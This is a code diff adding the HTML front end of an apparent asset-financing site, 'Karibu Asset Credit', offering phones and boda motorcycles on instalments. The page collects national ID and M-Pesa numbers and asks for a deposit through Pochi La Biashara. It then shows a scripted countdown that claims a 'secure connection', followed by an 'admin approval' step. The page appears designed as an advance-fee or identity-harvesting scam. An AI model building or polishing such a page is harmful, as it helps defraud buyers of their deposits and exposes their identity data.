@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Karibu Credit - Asset Financing</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>💚 Karibu Asset Credit</h1>
+            <p>Fast & reliable Lipa Polepole asset financing</p>
+        </header>
+
+        <!-- Horizontal Step Structure -->
+        <div class="stepper-horizontal">
+            <div class="step-item active" id="step-indicator-1"><div class="step-circle">1</div><div class="step-label">Model</div></div>
+            <div class="step-line"></div>
+            <div class="step-item" id="step-indicator-2"><div class="step-circle">2</div><div class="step-label">Info</div></div>
+            <div class="step-line"></div>
+            <div class="step-item" id="step-indicator-3"><div class="step-circle">3</div><div class="step-label">Pochi</div></div>
+            <div class="step-line"></div>
+            <div class="step-item" id="step-indicator-4"><div class="step-circle">4</div><div class="step-label">Verify</div></div>
+        </div>
+
+        <form id="credit-form">
+            <!-- STAGE 1: Model Selection -->
+            <div class="form-stage active" id="stage-1">
+                <h2>1. Choose Brand & Latest Model</h2>
+                <div class="product-grid">
+                    <label class="product-card"><input type="radio" name="product" value="Samsung Galaxy A17" data-category="Smartphone" data-price="2500" required><div class="card-content"><span class="icon">📱</span><h3>Samsung Galaxy A17</h3><p class="model-tag">Latest 2026 Model</p><p class="deposit-text">Deposit: KES 2,500</p></div></label>
+                    <label class="product-card"><input type="radio" name="product" value="Tecno Spark 30 Pro" data-category="Smartphone" data-price="2200"><div class="card-content"><span class="icon">📱</span><h3>Tecno Spark 30 Pro</h3><p class="model-tag">Latest 2026 Model</p><p class="deposit-text">Deposit: KES 2,200</p></div></label>
+                    <label class="product-card"><input type="radio" name="product" value="TVS HLX 150 Boda" data-category="Motorcycle" data-price="15000"><div class="card-content"><span class="icon">🏍️</span><h3>TVS HLX 150 Boda</h3><p class="model-tag">Latest 5-Speed</p><p class="deposit-text">Deposit: KES 15,000</p></div></label>
+                    <label class="product-card"><input type="radio" name="product" value="Roam Air Electric" data-category="Motorcycle" data-price="12000"><div class="card-content"><span class="icon">⚡</span><h3>Roam Air Electric</h3><p class="model-tag">Battery Swap Ready</p><p class="deposit-text">Deposit: KES 12,000</p></div></label>
+                </div>
+            </div>
+
+            <!-- STAGE 2: Details -->
+            <div class="form-stage" id="stage-2">
+                <h2>2. Applicant Details</h2>
+                <div class="input-group"><label>National ID Number</label><input type="number" id="idNumber" placeholder="e.g. 12345678" required></div>
+                <div class="input-group"><label>M-Pesa Phone Number</label><input type="tel" id="mpesaNumber" placeholder="07XXXXXXXX or 01XXXXXXXX" pattern="^(07|01)[0-9]{8}$" required></div>
+                <div class="input-group"><label>Confirm M-Pesa Number</label><input type="tel" id="mpesaNumberConfirm" placeholder="Re-enter phone number" required><small id="phone-match-error" style="color: #dc2626; display: none;">⚠️ Numbers do not match!</small></div>
+                <div class="input-group"><label>Delivery County / Town</label><input type="text" id="location" placeholder="e.g. Nairobi, Westlands" required></div>
+            </div>
+
+            <!-- STAGE 3: Pochi Instruction -->
+            <div class="form-stage" id="stage-3">
+                <h2>3. Complete Pochi La Biashara Payment</h2>
+                <div class="pochi-box">
+                    <p>Deposit for <span id="selected-model-title" style="color:#008744;">Model</span>:</p>
+                    <ol class="pochi-list">
+                        <li>Dial <strong>*334#</strong> &gt; Lipa na M-Pesa &gt; Pochi La Biashara</li>
+                        <li>Enter Deposit: <strong class="highlight-amount" id="pochi-display-amount">KES 0</strong></li>
+                    </ol>
+                </div>
+                <button type="button" id="i-have-paid-btn" class="btn-primary">I Have Sent The Payment</button>
+            </div>
+
+            <!-- STAGE 4: Countdown & Verification -->
+            <div class="form-stage" id="stage-4">
+                <h2>4. Verifying Transaction</h2>
+                <div class="stk-card" id="countdown-card">
+                    <h3>Finalizing Request...</h3>
+                    <div class="spinner-box">
+                        <div class="spinner"></div>
+                        <h1 id="countdown-timer" style="font-size: 3rem; color: #008744; margin: 15px 0;">10</h1>
+                        <p class="pin-notice">Prompting secure connection...</p>
+                    </div>
+                </div>
+                
+                <div class="stk-card" id="verification-card" style="display: none;">
+                    <h3>Awaiting Admin Approval</h3>
+                    <p>Your transaction details have been sent. Please wait while your deposit is confirmed.</p>
+                    <div class="spinner-box"><div class="spinner"></div></div>
+                </div>
+            </div>
+
+            <!-- STAGE 5: Success -->
+            <div class="form-stage" id="stage-5">
+                <div class="success-card">
+                    <div class="celebration-icon">🎊 🥳</div>
+                    <h2>CONGRATULATIONS!</h2>
+                    <p>Your deposit for <strong id="success-model-name">model</strong> has been approved! Delivery will proceed to your location shortly.</p>
+                </div>
+            </div>
+        </form>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
